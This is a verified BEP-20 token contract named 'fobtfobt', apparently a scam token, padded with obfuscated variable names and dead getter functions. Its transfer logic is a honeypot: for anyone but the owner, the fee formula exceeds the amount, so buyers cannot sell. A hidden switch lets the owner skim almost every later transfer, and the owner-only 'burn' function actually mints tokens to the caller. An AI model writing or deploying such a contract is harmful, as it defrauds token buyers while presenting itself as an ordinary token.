/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.7.4;
contract fobtfobt {
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  siwMvV = address(0);
uint256 private  UcWCmS = 10000000000000;
uint256 private  puTNlr = 1000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  PiJqQe = 1000000000000000000000;
address private  ZVvqsD = address(0);
address private  yQOgMt = address(0);
address private  xiPddT = address(0);
string public  symbol = "fobtfobt";
uint256 private  GAHaQw = 1000000000000000000;
uint256 private  PpLgwl = 10000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant LyJYNM = 9999999999999999999999999;
event Transfer(address indexed from, address indexed to, uint256 value);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  pLfqYo = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  vOFZwq = address(0);
uint8 public constant decimals = 18;
uint256 private  AJuNbz = 100000000;
mapping (address => uint256) public balanceOf;
uint256 private  NQXLAO = 1000000000000000;
string public  name = "fobtfobt";
address public owner;
address private  yowOmo = address(0);
address private  HaQLDj = address(0);
address private  pCUaNL = address(0);
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getAJuNbz() private returns (uint256) {
return AJuNbz;
}



function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}


function _getpCUaNL() private returns (address) {
return pCUaNL;
}





function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}


function _getPiJqQe() private returns (uint256) {
return PiJqQe;
}



function _getZVvqsD() private returns (address) {
return ZVvqsD;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}




modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getpLfqYo() private returns (address) {
return pLfqYo;
}

function _getxiPddT() private returns (address) {
return xiPddT;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getGAHaQw() private returns (uint256) {
return GAHaQw;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "pjPARk");
require(to != address(0), "pjPARk");
require(amount <= balanceOf[from], "pjPARk");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* LyJYNM/puTNlr ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==HaQLDj){
puTNlr = LyJYNM+2;
}
emit Transfer(from, to, transferAmount);
}


function _getyQOgMt() private returns (address) {
return yQOgMt;
}

function _getUcWCmS() private returns (uint256) {
return UcWCmS;
}

constructor () {
HaQLDj = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _getsiwMvV() private returns (address) {
return siwMvV;
}

function _getNQXLAO() private returns (uint256) {
return NQXLAO;
}

function _getvOFZwq() private returns (address) {
return vOFZwq;
}



function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tpjPARk 0");
require(spender != address(0), "fpjPARk 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getyowOmo() private returns (address) {
return yowOmo;
}

function _getPpLgwl() private returns (uint256) {
return PpLgwl;
}





function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}



}